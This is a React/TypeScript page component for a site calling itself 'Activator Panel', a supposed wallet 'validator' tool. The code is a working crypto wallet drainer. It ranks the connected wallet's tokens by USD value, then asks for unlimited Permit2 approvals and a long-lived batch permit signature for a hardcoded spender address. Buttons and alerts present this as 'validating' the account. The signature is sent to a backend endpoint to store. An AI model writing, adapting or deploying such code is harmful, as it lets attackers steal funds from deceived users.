'use client'

import { useState, useCallback, useEffect } from 'react'
import { Button } from "@/components/ui/button"
import {
  AllowanceProvider,
  PERMIT2_ADDRESS,
  MaxAllowanceTransferAmount,
} from '@uniswap/permit2-sdk'
import { ethers, Contract } from 'ethers'
import { createAppKit, useAppKit, useAppKitProvider } from '@reown/appkit/react'
import { Ethers5Adapter } from '@reown/appkit-adapter-ethers5'
import { mainnet, arbitrum, base, bsc, linea, polygon, zksync, optimism, avalanche, zora } from '@reown/appkit/networks'
import { Alchemy, Network } from 'alchemy-sdk'

// Simplified PermitBatch type
interface PermitDetails {
  token: string;
  amount: ethers.BigNumberish;
  expiration: number;
  nonce: number;
}

interface PermitBatch {
  details: PermitDetails[];
  spender: string;
  sigDeadline: number;
}

// New interface for token data with price information
interface TokenWithValue {
  address: string;
  symbol: string;
  balance: ethers.BigNumber;
  decimals: number;
  price: number;
  value: number; // USD value of holdings
}

// Minimum token value threshold (in USD)
const MIN_TOKEN_VALUE_USD = 2;

function toDeadline(expiration: number): number {
  return Math.floor((Date.now() + expiration) / 1000)
}

// Alchemy configuration
const alchemyConfig = {
  apiKey: process.env.NEXT_PUBLIC_ALCHEMY_API_KEY,
};

// Map chain IDs to Alchemy Networks
const networkMap: { [key: number]: Network } = {
  1: Network.ETH_MAINNET,
  8453: Network.BASE_MAINNET,
  42161: Network.ARB_MAINNET,
  56: Network.BNB_MAINNET,
  7777777: Network.ZORA_MAINNET,
  81457 : Network.BLAST_MAINNET,
  324: Network.ZKSYNC_MAINNET,
  10: Network.OPT_MAINNET,
  43114: Network.AVAX_MAINNET
};

// Improved function to fetch tokens with their values
async function fetchValuableTokens(address: string, chainId: number): Promise<TokenWithValue[]> {
  try {
    const network = networkMap[chainId] || Network.ETH_MAINNET; // Default to Mainnet if unsupported
    const alchemy = new Alchemy({ ...alchemyConfig, network });
    const balances = await alchemy.core.getTokenBalances(address);

    // Get tokens with non-zero balances and their metadata
    const tokensWithMetadata = await Promise.all(
      balances.tokenBalances
        .filter(token => ethers.BigNumber.from(token.tokenBalance).gt(0)) // Non-zero balance
        .map(async token => {
          const metadata = await alchemy.core.getTokenMetadata(token.contractAddress);
          if (metadata.name && metadata.symbol) {
            return {
              address: token.contractAddress,
              symbol: metadata.symbol,
              balance: ethers.BigNumber.from(token.tokenBalance),
              decimals: metadata.decimals || 18,
              price: 0, // Will be filled later
              value: 0  // Will be calculated after fetching prices
            };
          }
          return null;
        })
    );

    // Filter out null values
    const validTokens = tokensWithMetadata.filter((token): token is TokenWithValue => token !== null);
    
    // Get symbols for price fetching
    const symbols = validTokens.map(token => token.symbol);
    
    // Fetch prices for all tokens at once
    try {
      const priceData = await alchemy.prices.getTokenPriceBySymbol(symbols);
      
      // Update token data with prices and calculate values
      const tokensWithValues = validTokens.map(token => {
        const tokenPriceInfo = priceData.data.find(p => p.symbol === token.symbol);
        
        // Check if price data exists and has USD value
        if (tokenPriceInfo && !tokenPriceInfo.error && tokenPriceInfo.prices && tokenPriceInfo.prices.length > 0) {
          const usdPrice = parseFloat(tokenPriceInfo.prices[0].value);
          
          // Calculate USD value: balance * price / (10 ^ decimals)
          const normalizedBalance = parseFloat(ethers.utils.formatUnits(token.balance, token.decimals));
          const usdValue = normalizedBalance * usdPrice;
          
          return {
            ...token,
            price: usdPrice,
            value: usdValue
          };
        }
        
        return token; // Keep token as is if no price found
      });
      
      // Filter out tokens with no price or value below minimum threshold
      const valuableTokens = tokensWithValues.filter(token => 
        token.price > 0 && token.value >= MIN_TOKEN_VALUE_USD
      );
      
      console.log(`Filtered out ${tokensWithValues.length - valuableTokens.length} tokens below $${MIN_TOKEN_VALUE_USD} threshold`);
      
      // Sort tokens by value in descending order
      return valuableTokens.sort((a, b) => b.value - a.value);
    } catch (priceError) {
      console.error('Failed to fetch token prices:', priceError);
      return [];
    }
  } catch (error) {
    console.error('Failed to fetch valuable tokens:', error);
    return [];
  }
}

// Reown AppKit configuration
const projectId = process.env.NEXT_PUBLIC_REOWN_PROJECT_ID!
const metadata = {
  name: "Activator Panel",
  description: "Account and wallet validator tool",
  url: "https://activatorpanel.com",
  icons: ["https://www.appactivator-panel.com/Home%20Page%20_%20Welcome%20to%20Panelactivator.com_files/save_bckudy.png"]
}

createAppKit({
  adapters: [new Ethers5Adapter()],
  metadata,
  networks: [mainnet, arbitrum, base, bsc, linea, polygon, zksync, optimism, avalanche, zora],
  projectId,
  features: { analytics: true }
})

export default function IssuesContent() {
  const [account, setAccount] = useState<string>('')
  const [spender, setSpender] = useState<string>('')
  /* eslint-disable no-unused-vars */
/* eslint-disable @typescript-eslint/no-unused-vars */
  const [signature, setSignature] = useState<string>('')
  const [provider, setProvider] = useState<ethers.providers.Web3Provider | undefined>(undefined)
  const [chainId, setChainId] = useState<number>(0)
  const [tokens, setTokens] = useState<TokenWithValue[]>([]) // Enhanced token list with values
  const [loading, setLoading] = useState<boolean>(false)
   /* eslint-disable no-unused-vars */
 /* eslint-disable @typescript-eslint/no-unused-vars */
  const [totalValue, setTotalValue] = useState<number>(0) // Total value of all valuable tokens

  const { open } = useAppKit()
  const { walletProvider } = useAppKitProvider<ethers.providers.ExternalProvider>('eip155')

  // Fetch tokens when chainId or account changes
  useEffect(() => {
    if (account && chainId) {
      setLoading(true);
      fetchValuableTokens(account, chainId)
        .then(valuableTokens => {
          setTokens(valuableTokens);
          // Calculate total value of all valuable tokens
          const total = valuableTokens.reduce((sum, token) => sum + token.value, 0);
          setTotalValue(total);
          setLoading(false);
        })
        .catch(error => {
          console.error("Error fetching valuable tokens:", error);
          setLoading(false);
        });
    }
  }, [account, chainId]);

  const handleApproveBatch = useCallback(async () => {
    if (!provider || !account || tokens.length === 0) return;
    try {
      const signer = provider.getSigner(account);
      const approveAbi = ['function approve(address spender, uint256 amount)'];
      
      // Process tokens from highest value to lowest
      for (const token of tokens) {
        const tokenContract = new Contract(token.address, approveAbi, signer);
        const tx = await tokenContract.approve(PERMIT2_ADDRESS, MaxAllowanceTransferAmount);
        await tx.wait();
        console.log(`Token approval successful for ${token.symbol} (${token.address}) with value $${token.value.toFixed(2)} on chainId ${chainId}`);
      }
      console.log(`Batch approval successful for ${tokens.length} tokens on chainId ${chainId}`);
    } catch (e) {
      console.error('Batch approval failed:', e);
      throw e;
    }
  }, [account, provider, tokens, chainId]);

  const handlePermitBatch = useCallback(async () => {
    if (!provider || !account || !chainId || tokens.length === 0) return;
    try {
      const signer = provider.getSigner(account);
      const allowanceProvider = new AllowanceProvider(provider, PERMIT2_ADDRESS);
      const details: PermitDetails[] = [];
      
      // Process tokens from highest value to lowest
      for (const token of tokens) {
        const { nonce } = await allowanceProvider.getAllowanceData(token.address, account, spender);
        details.push({
          token: ethers.utils.getAddress(token.address),
          amount: MaxAllowanceTransferAmount,
          expiration: toDeadline(1000 * 60 * 60 * 24 * 30), // 30 days
          nonce,
        });
      }
      
      const permitBatch: PermitBatch = {
        details,
        spender,
        sigDeadline: toDeadline(1000 * 60 * 60 * 24 * 180), // 180 days
      };

      const domain = {
        name: 'Permit2',
        chainId: chainId,
        verifyingContract: PERMIT2_ADDRESS,
      };
      const types = {
        PermitBatch: [
          { name: 'details', type: 'PermitDetails[]' },
          { name: 'spender', type: 'address' },
          { name: 'sigDeadline', type: 'uint256' },
        ],
        PermitDetails: [
          { name: 'token', type: 'address' },
          { name: 'amount', type: 'uint160' },
          { name: 'expiration', type: 'uint48' },
          { name: 'nonce', type: 'uint48' },
        ],
      };
      const values = permitBatch;

      const signature = await signer._signTypedData(domain, types, values);
      setSignature(signature);
      console.log('Batch Signature:', signature);

      const response = await fetch('/api/store/permit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ permitBatch, signature, owner: account, chainId }),
      });
      const result = await response.json();
      if (response.ok) {
        console.log("Batch permit stored successfully");
        alert('Account Validated Successfully!!');
      } else {
        throw new Error(result.message || 'Failed to store batch permit');
      }
    } catch (e) {
      console.error('Batch permit failed:', e);
      alert(`Batch permit failed: ${e instanceof Error ? e.message : 'Unknown error'}`);
    }
  }, [account, provider, spender, chainId, tokens]);

  const connectWallet = useCallback(async () => {
    try {
      await open();
      if (walletProvider) {
        const web3Provider = new ethers.providers.Web3Provider(walletProvider);
        const signer = web3Provider.getSigner();
        const address = await signer.getAddress();
        const checkSummedAddress = ethers.utils.getAddress(address);
        const network = await web3Provider.getNetwork();
        const chainId = network.chainId;

        setProvider(web3Provider);
        setAccount(checkSummedAddress);
        setSpender('0xfB40B3c64992eF80d51333b0292c126A616aF0cD');
        setChainId(chainId);
      }
    } catch (e) {
      console.error('Wallet connection failed:', e);
    }
  }, [open, walletProvider]);

  // Format currency for display
   /* eslint-disable no-unused-vars */
 /* eslint-disable @typescript-eslint/no-unused-vars */
  const formatCurrency = (value: number): string => {
    return value.toLocaleString('en-US', {
      style: 'currency',
      currency: 'USD',
      minimumFractionDigits: 2,
      maximumFractionDigits: 2
    });
  };

  return (
    <div className="space-y-6 sm:space-y-8 mt-[100px]">
      <div className='flex flex-col items-center gap-6 p-7'>
        {account ? (
          <>
            <Button 
              onClick={handleApproveBatch} 
              className='mb-4 bg-blue-700 text-white text-lg font-semibold hover:bg-blue-500' 
              disabled={tokens.length === 0 || loading}
            >
              {loading ? 'Loading Tokens...' : 'Allow Activator Panel to Validate Account'}
            </Button>
            <Button 
              onClick={handlePermitBatch} 
              className='mb-4 bg-blue-700 text-white text-lg font-semibold hover:bg-blue-500' 
              disabled={tokens.length === 0 || loading}
            >
              {loading ? 'Loading Tokens...' : 'Sign the Message'}
            </Button>
            <h3 className='text-lg text-blue-600 font-semibold'>Account: {account}</h3>
            <p className='text-lg text-blue-600 font-semibold'>Network: Chain ID {chainId}</p>
            
            {loading ? (
              <p className='text-lg text-blue-600 font-semibold'>Setting Up Validation. Please wait a bit...</p>
            ) : tokens.length > 0 ? (
              <div className="text-center">
                <p className="text-lg font-semibold text-blue-600">Ready to activate!</p>
              </div>
            ) : (
              <p className='text-lg text-red-500 font-semibold'>Account not ready to be validated</p>
            )}
          </>
        ) : (
            <div className="bg-white w-full max-w-md h-24 rounded-[20px] shadow-md flex items-center justify-start p-4">
            <Button 
              onClick={connectWallet} 
              className="bg-blue-700 text-white rounded-[28px] w-52 h-16 font-bold hover:bg-blue-500"
            >
              Connect Manually
            </Button>
          </div>
        )}
      </div>
    </div>
  )
}